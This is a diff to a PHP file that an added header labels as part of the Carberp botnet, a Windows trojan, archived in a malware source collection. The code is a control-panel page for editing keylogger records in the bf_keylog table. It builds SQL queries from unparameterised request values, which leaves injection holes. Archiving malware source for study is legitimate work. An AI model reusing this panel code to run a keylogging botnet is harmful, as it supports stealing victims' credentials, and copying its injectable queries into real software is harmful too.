@@ -1,9 +1,22 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 <?php
 $smarty->assign('rand_name', mt_rand(0000000000, 9999999999));
 get_function('real_escape_string');
 
-if(!empty($Cur['id'])){	$item = $mysqli->query('SELECT * from bf_keylog WHERE id = '.$Cur['id'].' LIMIT 1');
-	if($item->id == $Cur['id']){		$smarty->assign("item", $item);
+if(!empty($Cur['id'])){
+	$item = $mysqli->query('SELECT * from bf_keylog WHERE id = '.$Cur['id'].' LIMIT 1');
+	if($item->id == $Cur['id']){
+		$smarty->assign("item", $item);
 		if(isset($_POST['submit'])){
 			@array_walk($_POST, 'real_escape_string');
 
@@ -16,11 +29,13 @@ if(!empty($Cur['id'])){	$item = $mysqli->query('SELECT * from bf_keylog WHERE i
 				$bad_form['hash'] = $lang['xnmbp'];
 				$FORM_BAD = 1;
 			}else{
-		        if($_POST['name'] == $item->name && $_POST['hash'] == $item->hash){		        	$bad_form['not_update'] = $lang['editno'];
+		        if($_POST['name'] == $item->name && $_POST['hash'] == $item->hash){
+		        	$bad_form['not_update'] = $lang['editno'];
 		        	$FORM_BAD = 1;
 		        }
 		        //echo $_POST['hash'] . '<br>' . $item->hash;
-		        if(!isset($bad_form['not_update']) && $_POST['hash'] != $item->hash){		        	$result = $mysqli->query("SELECT hash FROM bf_keylog WHERE (hash='".$_POST['hash']."')");
+		        if(!isset($bad_form['not_update']) && $_POST['hash'] != $item->hash){
+		        	$result = $mysqli->query("SELECT hash FROM bf_keylog WHERE (hash='".$_POST['hash']."')");
 		        	if($result->hash == $_POST['hash']){
 		        		$bad_form['hash'] = $lang['vxyes'];
 		        		$FORM_BAD = 1;
